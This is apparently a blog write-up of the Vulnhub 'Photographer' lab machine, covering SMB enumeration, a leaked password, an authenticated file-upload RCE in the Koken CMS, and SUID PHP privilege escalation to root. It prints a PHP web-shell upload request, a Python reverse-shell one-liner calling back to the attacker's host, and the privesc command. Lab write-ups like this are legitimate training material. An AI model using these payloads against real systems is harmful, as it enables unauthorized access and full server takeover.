---
layout: post
title:  "Vulnhub - Photographer"
date:   2020-08-28 00:00:00 +1000
category: hacking
---

## Introduction
*This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.*

[File](https://www.vulnhub.com/entry/photographer-1,519/). Not zipped strangely, so it's a 2.6Gb download as an ova file.

## Nmap
We've got four ports: SMB (139/445), HTTP on 80 and port 8000. If you guessed that's a second HTTP port, you're correct.

## SMB

smbclient let me enumerate the shares, but didn't seem to want to connect to the one we wanted:

{% highlight shell %}
root@kali:/opt/vulnhub/photographer# smbclient -L ////192.168.1.78//sambashare
Enter WORKGROUP\roots password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
{% endhighlight %}

But it's okay, because impacket can help:

{% highlight shell %}
root@kali:/opt/vulnhub/photographer# /opt/impacket/examples/smbclient.py 192.168.1.78
Impacket v0.9.22.dev1+20200422.223359.23bbfbe1 - Copyright 2020 SecureAuth Corporation

Type help for list of commands
# shares
print$
sambashare
IPC$
# use sambashare
# ls
drw-rw-rw-          0  Tue Jul 21 01:30:07 2020 .
drw-rw-rw-          0  Tue Jul 21 09:44:25 2020 ..
-rw-rw-rw-        503  Tue Jul 21 01:29:39 2020 mailsent.txt
-rw-rw-rw-   13930308  Tue Jul 21 01:22:23 2020 wordpress.bkp.zip
# get mailsent.txt
# get wordpress.bkp.zip
# exit
{% endhighlight %}

From these files, we get something immediately useful:

{% highlight shell %}
root@kali:/opt/vulnhub/photographer# cat mailsent.txt 
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Websites
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Dont forget your secret, my babygirl ;)
{% endhighlight %}

## Webserver
The page on port 8000 seems to be the most interesting one, and it's running a CMS called Koken, which is seemingly designed for photographic content. Running searchsploit shows an Authenticed RCE for a version of it, so that may be what we're after.

Fuzzing with WFUZZ:

``
root@kali:/opt/vulnhub/photographer# wfuzz --hh 0 -u http://192.168.1.78:8000/FUZZ -w /usr/share/dirb/wordlists/big.txt
``

gives us a page called **/admin** that allows login; it wants an email address and a password. We try it with **daisa@photographer.com:babygirl** and we're in.

## Authenticated RCE
Checking the searchsploit entry we find that after logging in we can upload PHP code in a file with a jpeg extension but then change the file extension in Burp Suite Repeater. So my request looks like this (sorry for the wall of text):

{% highlight html %}
POST /api.php?/content HTTP/1.1
Host: 192.168.1.78:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.78:8000/admin/
x-koken-auth: cookie
Content-Type: multipart/form-data; boundary=---------------------------15437199420792611378553372
Content-Length: 1052
Connection: close
Cookie: koken_referrer=; koken_session_ci=KDz4yYnLMlltcWgAGYKO SNIPPED

-----------------------------15437199420792611378553372
Content-Disposition: form-data; name="name"
cmd.php
-----------------------------15437199420792611378553372
Content-Disposition: form-data; name="chunk"
0
-----------------------------15437199420792611378553372
Content-Disposition: form-data; name="chunks"
1
-----------------------------15437199420792611378553372
Content-Disposition: form-data; name="upload_session_start"
1598587652
-----------------------------15437199420792611378553372
Content-Disposition: form-data; name="visibility"
public
-----------------------------15437199420792611378553372
Content-Disposition: form-data; name="license"
all
-----------------------------15437199420792611378553372
Content-Disposition: form-data; name="max_download"
none
-----------------------------15437199420792611378553372
Content-Disposition: form-data; name="file"; filename="cmd.jpeg"
Content-Type: image/jpeg
<?php system($_GET['cmd']);?>
-----------------------------15437199420792611378553372--
{% endhighlight %}

Then we go find that file and send it commands like this:

``
GET //storage//originals//93//9c//cmd.php?cmd=python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("192.168.1.77",1234))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call(["/bin/sh","-i"])%3b' HTTP/1.1
``

Which gets us a shell.

## www-data
We're on the box as www-data, but we can read the user flag from **/home/daisa**:
*d41d8cd98f00b204e9800998ecf8427e*

Now what?

Well, we can get the database credentials from here:
>www-data@photographer:/$ cat /var/www/html/koken/storage/configuration/database.php  
'username' => 'kokenuser',  
'password' => 'user_password_here',  

And log into mysql:

>www-data@photographer:/$ mysql --host=127.0.0.1 --port 3306 -u kokenuser -p  
mysql --host=127.0.0.1 --port 3306 -u kokenuser -p  
Enter password: user_password_here

But the only user is daisa, and we already know her password so grabbing the hash ($2a$08$ruF3jtzIEZF1JMy/osNYj.ibzEiHWYCE4qsC6P/sMBZorx2ZTSGwK) isn't very helpful. 

## Privesc
Running linpeas gives us a list of SUID binaries, and one of them is PHP. Although it doesn't highlight it, this is our way in. [GTFOBins](https://gtfobins.github.io/gtfobins/php/) shows the way:

``
php -r "pcntl_exec('/bin/sh', ['-p']);"
``

{% highlight shell %}
# whoami
whoami
root
# cat proof.txt
cat proof.txt
Follow me at: http://v1n1v131r4.com
d41d8cd98f00b204e9800998ecf8427e
{% endhighlight %}
